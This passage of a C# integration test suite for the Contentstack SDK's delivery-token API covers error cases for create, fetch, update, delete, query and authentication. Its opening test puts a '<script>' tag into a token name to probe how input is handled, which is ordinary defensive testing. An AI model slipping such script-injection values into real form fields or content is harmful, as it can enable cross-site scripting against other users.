                };

                ContentstackResponse response = _stack.DeliveryToken().Create(model);
                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Should accept token with special characters");
                
                // Get token UID for cleanup
                var responseObject = response.OpenJsonObjectResponse();
                var tokenData = responseObject["token"] as JsonObject;
                string createdTokenUid = tokenData["uid"]?.ToString();
                
                // Verify name contains special characters
                AssertLogger.IsTrue(model.Name.Contains("<script>"), "Name should contain special characters");
                
                // Clean up
                if (!string.IsNullOrEmpty(createdTokenUid))
                {
                    try { _stack.DeliveryToken(createdTokenUid).Delete(); } catch { }
                }
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test026_Should_Fail_Create_With_Null_Scope()
        {
            TestOutputLogger.LogContext("TestScenario", "Test026_Should_Fail_Create_With_Null_Scope");
            var model = BuildInvalidTokenModel("null_scope");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithNullScope",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test027_Should_Fail_Create_With_Empty_Scope()
        {
            TestOutputLogger.LogContext("TestScenario", "Test027_Should_Fail_Create_With_Empty_Scope");
            var model = BuildInvalidTokenModel("empty_scope");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithEmptyScope",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test028_Should_Fail_Create_With_Invalid_Module_Name()
        {
            TestOutputLogger.LogContext("TestScenario", "Test028_Should_Fail_Create_With_Invalid_Module_Name");
            var model = BuildInvalidTokenModel("invalid_module");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithInvalidModuleName",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test029_Should_Fail_Create_With_Null_Environments()
        {
            TestOutputLogger.LogContext("TestScenario", "Test029_Should_Fail_Create_With_Null_Environments");
            var model = BuildInvalidTokenModel("null_environments");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithNullEnvironments",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test030_Should_Fail_Create_With_Empty_Environments()
        {
            TestOutputLogger.LogContext("TestScenario", "Test030_Should_Fail_Create_With_Empty_Environments");
            var model = BuildInvalidTokenModel("empty_environments");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithEmptyEnvironments",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test031_Should_Fail_Create_With_Invalid_Environment_Uid()
        {
            TestOutputLogger.LogContext("TestScenario", "Test031_Should_Fail_Create_With_Invalid_Environment_Uid");
            var model = BuildInvalidTokenModel("invalid_environment");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithInvalidEnvironmentUid",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test032_Should_Fail_Create_With_Null_Branches()
        {
            TestOutputLogger.LogContext("TestScenario", "Test032_Should_Fail_Create_With_Null_Branches");
            var model = BuildInvalidTokenModel("null_branches");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithNullBranches",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test033_Should_Fail_Create_With_Invalid_Branch_Names()
        {
            TestOutputLogger.LogContext("TestScenario", "Test033_Should_Fail_Create_With_Invalid_Branch_Names");
            var model = BuildInvalidTokenModel("invalid_branches");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithInvalidBranchNames",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test034_Should_Fail_Create_With_Invalid_ACL_Structure()
        {
            TestOutputLogger.LogContext("TestScenario", "Test034_Should_Fail_Create_With_Invalid_ACL_Structure");
            var model = BuildInvalidTokenModel("invalid_acl");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken().Create(model),
                "CreateWithInvalidACLStructure",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test035_Should_Fail_Create_With_Duplicate_Name()
        {
            TestOutputLogger.LogContext("TestScenario", "Test035_Should_Fail_Create_With_Duplicate_Name");
            try
            {
                // First, create a token to establish the name
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                // Now try to create another token with the same name
                var duplicateModel = new DeliveryTokenModel
                {
                    Name = _testTokenModel.Name,
                    Description = "Duplicate name test",
                    Scope = BuildValidScope(_testEnvironmentUid)
                };

                AssertLogger.ThrowsContentstackError(
                    () => _stack.DeliveryToken().Create(duplicateModel),
                    "CreateWithDuplicateName",
                    HttpStatusCode.Conflict,
                    HttpStatusCode.BadRequest,
                    (HttpStatusCode)422);
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Duplicate name test failed unexpectedly: {ex.Message}");
            }
        }

        #region Create Async Error Tests

        [TestMethod]
        [DoNotParallelize]
        public async Task Test036_Should_Fail_Create_With_Null_Model_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test036_Should_Fail_Create_With_Null_Model_Async");
            AssertLogger.ThrowsException<ArgumentNullException>(
                () => _stack.DeliveryToken().CreateAsync(null),
                "CreateWithNullModelAsync");
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test037_Should_Fail_Create_With_Invalid_Scope_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test037_Should_Fail_Create_With_Invalid_Scope_Async");
            var model = BuildInvalidTokenModel("invalid_module");
            await AssertLogger.ThrowsContentstackErrorAsync(
                async () => await _stack.DeliveryToken().CreateAsync(model),
                "CreateWithInvalidScopeAsync",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test038_Should_Fail_Create_Duplicate_Name_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test038_Should_Fail_Create_Duplicate_Name_Async");
            try
            {
                // Ensure we have a token to create a duplicate of
                if (string.IsNullOrEmpty(_deliveryTokenUid))
                {
                    await Test001_Should_Create_Delivery_Token();
                }

                var duplicateModel = new DeliveryTokenModel
                {
                    Name = _testTokenModel.Name,
                    Description = "Async duplicate name test",
                    Scope = BuildValidScope(_testEnvironmentUid)
                };

                await AssertLogger.ThrowsContentstackErrorAsync(
                    async () => await _stack.DeliveryToken().CreateAsync(duplicateModel),
                    "CreateDuplicateNameAsync",
                    HttpStatusCode.Conflict,
                    HttpStatusCode.BadRequest,
                    (HttpStatusCode)422);
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Async duplicate name test failed unexpectedly: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test039_Should_Fail_Create_Environment_Only_Scope_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test039_Should_Fail_Create_Environment_Only_Scope_Async");
            var model = BuildInvalidTokenModel("environment_only");
            await AssertLogger.ThrowsContentstackErrorAsync(
                async () => await _stack.DeliveryToken().CreateAsync(model),
                "CreateEnvironmentOnlyScopeAsync",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422);
        }

        #endregion

        #endregion

        #region B — Fetch Operation Error Tests (Test040-Test049)

        [TestMethod]
        [DoNotParallelize]
        public void Test040_Should_Fail_Fetch_With_Null_Uid()
        {
            TestOutputLogger.LogContext("TestScenario", "Test040_Should_Fail_Fetch_With_Null_Uid");
            AssertLogger.ThrowsException<ArgumentException>(
                () => _stack.DeliveryToken(null).Fetch(),
                "FetchWithNullUid");
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test041_Should_Fail_Fetch_With_Empty_Uid()
        {
            TestOutputLogger.LogContext("TestScenario", "Test041_Should_Fail_Fetch_With_Empty_Uid");
            AssertLogger.ThrowsException<ArgumentException>(
                () => _stack.DeliveryToken("").Fetch(),
                "FetchWithEmptyUid");
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test042_Should_Fail_Fetch_With_Invalid_Uid_Format()
        {
            TestOutputLogger.LogContext("TestScenario", "Test042_Should_Fail_Fetch_With_Invalid_Uid_Format");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken(InvalidTokenUid).Fetch(),
                "FetchWithInvalidUidFormat",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test043_Should_Fail_Fetch_NonExistent_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test043_Should_Fail_Fetch_NonExistent_Token");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken(NonExistentTokenUid).Fetch(),
                "FetchNonExistentToken",
                HttpStatusCode.NotFound,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test044_Should_Fail_Fetch_Deleted_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test044_Should_Fail_Fetch_Deleted_Token");
            try
            {
                // Create a temporary token to delete and then try to fetch
                string tempTokenUid = await CreateTemporaryTokenForTesting("delete_test");
                AssertLogger.IsNotNull(tempTokenUid, "Temporary token should be created successfully");

                // Delete the token
                ContentstackResponse deleteResponse = await _stack.DeliveryToken(tempTokenUid).DeleteAsync();
                AssertLogger.IsTrue(deleteResponse.IsSuccessStatusCode, "Token deletion should succeed");

                // Now try to fetch the deleted token
                AssertLogger.ThrowsContentstackError(
                    () => _stack.DeliveryToken(tempTokenUid).Fetch(),
                    "FetchDeletedToken",
                    HttpStatusCode.NotFound,
                    (HttpStatusCode)422);
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Fetch deleted token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test045_Should_Fail_Fetch_With_Malformed_Uid()
        {
            TestOutputLogger.LogContext("TestScenario", "Test045_Should_Fail_Fetch_With_Malformed_Uid");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken(MalformedTokenUid).Fetch(),
                "FetchWithMalformedUid",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        #region Fetch Async Error Tests

        [TestMethod]
        [DoNotParallelize]
        public async Task Test046_Should_Fail_Fetch_NonExistent_Token_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test046_Should_Fail_Fetch_NonExistent_Token_Async");
            await AssertLogger.ThrowsContentstackErrorAsync(
                async () => await _stack.DeliveryToken(NonExistentTokenUid).FetchAsync(),
                "FetchNonExistentTokenAsync",
                HttpStatusCode.NotFound,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test047_Should_Fail_Fetch_With_Invalid_Uid_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test047_Should_Fail_Fetch_With_Invalid_Uid_Async");
            await AssertLogger.ThrowsContentstackErrorAsync(
                async () => await _stack.DeliveryToken(InvalidTokenUid).FetchAsync(),
                "FetchWithInvalidUidAsync",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test048_Should_Fail_Fetch_Null_Uid_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test048_Should_Fail_Fetch_Null_Uid_Async");
            await AssertLogger.ThrowsExceptionAsync<ArgumentException>(
                async () => await _stack.DeliveryToken(null).FetchAsync(),
                "FetchNullUidAsync");
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test049_Should_Fail_Fetch_Empty_Uid_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test049_Should_Fail_Fetch_Empty_Uid_Async");
            await AssertLogger.ThrowsExceptionAsync<ArgumentException>(
                async () => await _stack.DeliveryToken("").FetchAsync(),
                "FetchEmptyUidAsync");
        }

        #endregion

        #endregion

        #region C — Update Operation Error Tests (Test050-Test059)

        [TestMethod]
        [DoNotParallelize]
        public void Test050_Should_Fail_Update_NonExistent_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test050_Should_Fail_Update_NonExistent_Token");
            var model = BuildInvalidTokenModel("null_name");
            model.Name = "Updated Name";
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken(NonExistentTokenUid).Update(model),
                "UpdateNonExistentToken",
                HttpStatusCode.NotFound,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test051_Should_Fail_Update_Deleted_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test051_Should_Fail_Update_Deleted_Token");
            try
            {
                // Create a temporary token to delete and then try to update
                string tempTokenUid = await CreateTemporaryTokenForTesting("update_delete_test");
                AssertLogger.IsNotNull(tempTokenUid, "Temporary token should be created successfully");

                // Delete the token
                ContentstackResponse deleteResponse = await _stack.DeliveryToken(tempTokenUid).DeleteAsync();
                AssertLogger.IsTrue(deleteResponse.IsSuccessStatusCode, "Token deletion should succeed");

                // Now try to update the deleted token
                var updateModel = new DeliveryTokenModel
                {
                    Name = "Updated Deleted Token",
                    Description = "Attempting to update a deleted token",
                    Scope = BuildValidScope(_testEnvironmentUid)
                };

                AssertLogger.ThrowsContentstackError(
                    () => _stack.DeliveryToken(tempTokenUid).Update(updateModel),
                    "UpdateDeletedToken",
                    HttpStatusCode.NotFound,
                    (HttpStatusCode)422);
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Update deleted token test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test052_Should_Fail_Update_With_Null_Model()
        {
            TestOutputLogger.LogContext("TestScenario", "Test052_Should_Fail_Update_With_Null_Model");
            AssertLogger.ThrowsException<ArgumentNullException>(
                () => _stack.DeliveryToken(NonExistentTokenUid).Update(null),
                "UpdateWithNullModel");
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test053_Should_Fail_Update_With_Conflicting_Name()
        {
            TestOutputLogger.LogContext("TestScenario", "Test053_Should_Fail_Update_With_Conflicting_Name");
            try
            {
                // Enhanced cleanup before creating tokens
                await CleanupTestResources();
                
                // Use timestamp-based names to avoid conflicts with existing tokens
                var timestamp = DateTimeOffset.UtcNow.ToUnixTimeSeconds();
                var token1Name = $"Temp Test Token conflict_1_{timestamp}";
                var token2Name = $"Temp Test Token conflict_2_{timestamp}";

                // Create first token
                string token1Uid = await CreateTemporaryTokenForTesting(token1Name);
                AssertLogger.IsNotNull(token1Uid, "First token should be created successfully");

                // Create second token  
                string token2Uid = await CreateTemporaryTokenForTesting(token2Name);
                AssertLogger.IsNotNull(token2Uid, "Second token should be created successfully");

                // Try to update token2 with token1's name (should fail)
                var updateModel = new DeliveryTokenModel
                {
                    Name = token1Name, // This should cause conflict
                    Description = "Conflicting name update",
                    Scope = BuildValidScope(_testEnvironmentUid)
                };

                AssertLogger.ThrowsContentstackError(
                    () => _stack.DeliveryToken(token2Uid).Update(updateModel),
                    "UpdateWithConflictingName",
                    HttpStatusCode.Conflict,
                    HttpStatusCode.BadRequest,
                    (HttpStatusCode)422);

                // Clean up both tokens
                try
                {
                    await _stack.DeliveryToken(token1Uid).DeleteAsync();
                    await _stack.DeliveryToken(token2Uid).DeleteAsync();
                }
                catch { }
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Update name conflict test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test054_Should_Fail_Update_With_Invalid_Scope_Change()
        {
            TestOutputLogger.LogContext("TestScenario", "Test054_Should_Fail_Update_With_Invalid_Scope_Change");
            var model = BuildInvalidTokenModel("invalid_module");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken(NonExistentTokenUid).Update(model),
                "UpdateWithInvalidScopeChange",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        #region Update Async Error Tests

        [TestMethod]
        [DoNotParallelize]
        public async Task Test055_Should_Fail_Update_NonExistent_Token_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test055_Should_Fail_Update_NonExistent_Token_Async");
            var model = new DeliveryTokenModel
            {
                Name = "Async Update Name",
                Description = "Async update test",
                Scope = BuildValidScope(_testEnvironmentUid)
            };
            
            await AssertLogger.ThrowsContentstackErrorAsync(
                async () => await _stack.DeliveryToken(NonExistentTokenUid).UpdateAsync(model),
                "UpdateNonExistentTokenAsync",
                HttpStatusCode.NotFound,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test056_Should_Fail_Update_With_Invalid_Data_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test056_Should_Fail_Update_With_Invalid_Data_Async");
            var model = BuildInvalidTokenModel("null_name");
            await AssertLogger.ThrowsContentstackErrorAsync(
                async () => await _stack.DeliveryToken(NonExistentTokenUid).UpdateAsync(model),
                "UpdateWithInvalidDataAsync",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test057_Should_Fail_Update_With_Null_Model_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test057_Should_Fail_Update_With_Null_Model_Async");
            AssertLogger.ThrowsException<ArgumentNullException>(
                () => _stack.DeliveryToken(NonExistentTokenUid).UpdateAsync(null),
                "UpdateWithNullModelAsync");
        }

        #endregion

        #endregion

        #region D — Delete Operation Error Tests (Test060-Test069)

        [TestMethod]
        [DoNotParallelize]
        public void Test060_Should_Fail_Delete_With_Null_Uid()
        {
            TestOutputLogger.LogContext("TestScenario", "Test060_Should_Fail_Delete_With_Null_Uid");
            AssertLogger.ThrowsException<ArgumentException>(
                () => _stack.DeliveryToken(null).Delete(),
                "DeleteWithNullUid");
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test061_Should_Fail_Delete_NonExistent_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test061_Should_Fail_Delete_NonExistent_Token");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken(NonExistentTokenUid).Delete(),
                "DeleteNonExistentToken",
                HttpStatusCode.NotFound,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test062_Should_Fail_Delete_Already_Deleted_Token()
        {
            TestOutputLogger.LogContext("TestScenario", "Test062_Should_Fail_Delete_Already_Deleted_Token");
            try
            {
                // Create a temporary token to delete twice
                string tempTokenUid = await CreateTemporaryTokenForTesting("double_delete_test");
                AssertLogger.IsNotNull(tempTokenUid, "Temporary token should be created successfully");

                // Delete the token first time
                ContentstackResponse deleteResponse = await _stack.DeliveryToken(tempTokenUid).DeleteAsync();
                AssertLogger.IsTrue(deleteResponse.IsSuccessStatusCode, "First deletion should succeed");

                // Try to delete again
                AssertLogger.ThrowsContentstackError(
                    () => _stack.DeliveryToken(tempTokenUid).Delete(),
                    "DeleteAlreadyDeletedToken",
                    HttpStatusCode.NotFound,
                    (HttpStatusCode)422);
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Double delete test failed: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test063_Should_Fail_Delete_With_Invalid_Uid_Format()
        {
            TestOutputLogger.LogContext("TestScenario", "Test063_Should_Fail_Delete_With_Invalid_Uid_Format");
            AssertLogger.ThrowsContentstackError(
                () => _stack.DeliveryToken(InvalidTokenUid).Delete(),
                "DeleteWithInvalidUidFormat",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        #region Delete Async Error Tests

        [TestMethod]
        [DoNotParallelize]
        public async Task Test064_Should_Fail_Delete_NonExistent_Token_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test064_Should_Fail_Delete_NonExistent_Token_Async");
            await AssertLogger.ThrowsContentstackErrorAsync(
                async () => await _stack.DeliveryToken(NonExistentTokenUid).DeleteAsync(),
                "DeleteNonExistentTokenAsync",
                HttpStatusCode.NotFound,
                (HttpStatusCode)422);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test065_Should_Fail_Delete_With_Invalid_Uid_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test065_Should_Fail_Delete_With_Invalid_Uid_Async");
            await AssertLogger.ThrowsContentstackErrorAsync(
                async () => await _stack.DeliveryToken(InvalidTokenUid).DeleteAsync(),
                "DeleteWithInvalidUidAsync",
                HttpStatusCode.BadRequest,
                (HttpStatusCode)422,
                HttpStatusCode.NotFound);
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test066_Should_Fail_Delete_Null_Uid_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test066_Should_Fail_Delete_Null_Uid_Async");
            await AssertLogger.ThrowsExceptionAsync<ArgumentException>(
                async () => await _stack.DeliveryToken(null).DeleteAsync(),
                "DeleteNullUidAsync");
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test067_Should_Fail_Delete_Empty_Uid_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test067_Should_Fail_Delete_Empty_Uid_Async");
            await AssertLogger.ThrowsExceptionAsync<ArgumentException>(
                async () => await _stack.DeliveryToken("").DeleteAsync(),
                "DeleteEmptyUidAsync");
        }

        #endregion

        #endregion

        #region E — Query Operation Error Tests (Test070-Test079)

        [TestMethod]
        [DoNotParallelize]
        public void Test070_Should_Accept_Query_With_Negative_Limit()
        {
            TestOutputLogger.LogContext("TestScenario", "Test070_Should_Accept_Query_With_Negative_Limit");
            try
            {
                ContentstackResponse response = _stack.DeliveryToken().Query().Limit(-1).Find();
                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Should accept query with negative limit");
                
                // Server should return results even with negative limit
                var tokens = response.OpenJsonObjectResponse()["tokens"];
                AssertLogger.IsNotNull(tokens, "Should return tokens array");
            }
            catch (ArgumentException ex)
            {
                // If SDK has client-side validation, that's also acceptable
                AssertLogger.IsTrue(true, $"SDK validation caught negative limit: {ex.Message}", "NegativeLimitValidation");
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Test failed with unexpected exception: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test071_Should_Fail_Query_With_Negative_Skip()
        {
            TestOutputLogger.LogContext("TestScenario", "Test071_Should_Fail_Query_With_Negative_Skip");
            try
            {
                AssertLogger.ThrowsContentstackError(
                    () => _stack.DeliveryToken().Query().Skip(-1).Find(),
                    "QueryWithNegativeSkip",
                    HttpStatusCode.BadRequest,
                    (HttpStatusCode)422);
            }
            catch (ArgumentException ex)
            {
                // SDK might catch this before API call
                AssertLogger.IsTrue(true, $"SDK validation caught negative skip: {ex.Message}", "NegativeSkipValidation");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test072_Should_Accept_Query_With_Excessive_Limit()
        {
            TestOutputLogger.LogContext("TestScenario", "Test072_Should_Accept_Query_With_Excessive_Limit");
            try
            {
                ContentstackResponse response = _stack.DeliveryToken().Query().Limit(10000).Find();
                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Should accept query with large limit");
                
                // Server should return results even with excessive limit
                var tokens = response.OpenJsonObjectResponse()["tokens"];
                AssertLogger.IsNotNull(tokens, "Should return tokens array");
            }
            catch (ArgumentException ex)
            {
                // If SDK has client-side validation, that's also acceptable
                AssertLogger.IsTrue(true, $"SDK validation caught excessive limit: {ex.Message}", "ExcessiveLimitValidation");
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Test failed with unexpected exception: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test073_Should_Handle_Query_With_Invalid_Parameters()
        {
            TestOutputLogger.LogContext("TestScenario", "Test073_Should_Handle_Query_With_Invalid_Parameters");
            try
            {
                // Test query with some edge case parameters
                var query = _stack.DeliveryToken().Query();
                query.Limit(0); // Zero limit might be invalid
                
                ContentstackResponse response = query.Find();
                
                // If this succeeds, verify the response is still valid
                AssertLogger.IsTrue(response.IsSuccessStatusCode || 
                                   response.StatusCode == HttpStatusCode.BadRequest ||
                                   response.StatusCode == (HttpStatusCode)422,
                    "Query should either succeed or fail with appropriate error", 
                    "InvalidParametersHandling");
            }
            catch (Exception ex)
            {
                // Any exception is acceptable for invalid parameters
                Console.WriteLine($"Query with invalid parameters threw exception (acceptable): {ex.Message}");
            }
        }

        #region Query Async Error Tests

        [TestMethod]
        [DoNotParallelize]
        public async Task Test074_Should_Accept_Query_With_Invalid_Parameters_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test074_Should_Accept_Query_With_Invalid_Parameters_Async");
            try
            {
                ContentstackResponse response = await _stack.DeliveryToken().Query().Limit(-5).FindAsync();
                AssertLogger.IsTrue(response.IsSuccessStatusCode, "Should accept async query with negative limit");
                
                // Server should return results even with negative limit
                var tokens = response.OpenJsonObjectResponse()["tokens"];
                AssertLogger.IsNotNull(tokens, "Should return tokens array");
            }
            catch (ArgumentException ex)
            {
                // If SDK has client-side validation, that's also acceptable
                AssertLogger.IsTrue(true, $"SDK validation caught invalid parameters in async query: {ex.Message}", "AsyncInvalidParamsValidation");
            }
            catch (Exception ex)
            {
                AssertLogger.Fail($"Async test failed with unexpected exception: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test075_Should_Handle_Query_Async_Edge_Cases()
        {
            TestOutputLogger.LogContext("TestScenario", "Test075_Should_Handle_Query_Async_Edge_Cases");
            try
            {
                // Test with extreme skip value
                var response = await _stack.DeliveryToken().Query().Skip(999999).FindAsync();
                
                // Should either succeed with empty results or fail gracefully
                AssertLogger.IsTrue(response.IsSuccessStatusCode || 
                                   response.StatusCode == HttpStatusCode.BadRequest ||
                                   response.StatusCode == (HttpStatusCode)422,
                    "Async query with extreme skip should handle gracefully", 
                    "AsyncQueryEdgeCases");
            }
            catch (Exception ex)
            {
                // Exceptions are acceptable for edge cases
                Console.WriteLine($"Async query edge case threw exception (acceptable): {ex.Message}");
            }
        }

        #endregion

        #endregion

        #region F — Authentication/Authorization Error Tests (Test080-Test089)

        [TestMethod]
        [DoNotParallelize]
        public void Test080_Should_Fail_Operations_With_Invalid_Stack_Context()
        {
            TestOutputLogger.LogContext("TestScenario", "Test080_Should_Fail_Operations_With_Invalid_Stack_Context");
            try
            {
                // Create a stack with an invalid API key to test authentication failure
                var invalidStack = _client.Stack("invalid_api_key_12345");
                
                AssertLogger.ThrowsContentstackError(
                    () => invalidStack.DeliveryToken().Query().Find(),
                    "OperationsWithInvalidStackContext",
                    HttpStatusCode.Unauthorized,
                    HttpStatusCode.Forbidden,
                    HttpStatusCode.NotFound);
            }
            catch (Exception ex)
            {
                // Log the attempt - some authentication errors might be caught at client level
                Console.WriteLine($"Invalid stack context test result: {ex.Message}");
                AssertLogger.IsTrue(true, "Authentication validation handled", "InvalidStackAuth");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public void Test081_Should_Handle_Authentication_Edge_Cases()
        {
            TestOutputLogger.LogContext("TestScenario", "Test081_Should_Handle_Authentication_Edge_Cases");
            try
            {
                // Test with empty API key
                var emptyKeyStack = _client.Stack("");
                
                AssertLogger.ThrowsContentstackError(
                    () => emptyKeyStack.DeliveryToken().Query().Find(),
                    "AuthenticationEdgeCases",
                    HttpStatusCode.Unauthorized,
                    HttpStatusCode.Forbidden,
                    HttpStatusCode.BadRequest);
            }
            catch (ArgumentException ex)
            {
                // SDK validation is acceptable
                AssertLogger.IsTrue(true, $"SDK caught empty API key: {ex.Message}", "EmptyKeyValidation");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Authentication edge case result: {ex.Message}");
            }
        }

        [TestMethod]
        [DoNotParallelize]
        public async Task Test082_Should_Handle_Permission_Scenarios_Async()
        {
            TestOutputLogger.LogContext("TestScenario", "Test082_Should_Handle_Permission_Scenarios_Async");
            try
            {
                // Test operations that might require specific permissions
                // Note: This test may pass if the current user has full permissions
                var response = await _stack.DeliveryToken().Query().FindAsync();
                
                if (response.IsSuccessStatusCode)
                {
                    // If query succeeds, try create operation which might have different permissions
                    var testModel = new DeliveryTokenModel
                    {
                        Name = "Permission Test Token",
                        Description = "Testing permission scenarios",
                        Scope = BuildValidScope(_testEnvironmentUid)
                    };
                    
                    var createResponse = await _stack.DeliveryToken().CreateAsync(testModel);
                    
                    if (createResponse.IsSuccessStatusCode)
                    {
                        // Clean up the test token if created
                        var responseObject = createResponse.OpenJsonObjectResponse();
                        var tokenData = responseObject["token"] as JsonObject;
                        string tokenUid = tokenData["uid"]?.ToString();
                        
                        if (!string.IsNullOrEmpty(tokenUid))
                        {
                            try
                            {
                                await _stack.DeliveryToken(tokenUid).DeleteAsync();
                            }
                            catch { }
                        }
                        
                        AssertLogger.IsTrue(true, "User has sufficient permissions for delivery token operations", "PermissionsCheck");
                    }
                }
                else
                {
                    AssertLogger.IsTrue(
                        response.StatusCode == HttpStatusCode.Unauthorized ||
                        response.StatusCode == HttpStatusCode.Forbidden,
                        "Expected permission-related error status",
                        "PermissionError");
                }
            }
            catch (ContentstackErrorException cex)
            {
                AssertLogger.IsTrue(
                    cex.StatusCode == HttpStatusCode.Unauthorized || 
                    cex.StatusCode == HttpStatusCode.Forbidden,
                    $"Expected permission error, got {cex.StatusCode}",
                    "PermissionExceptionCheck");
            }
        }

        #endregion

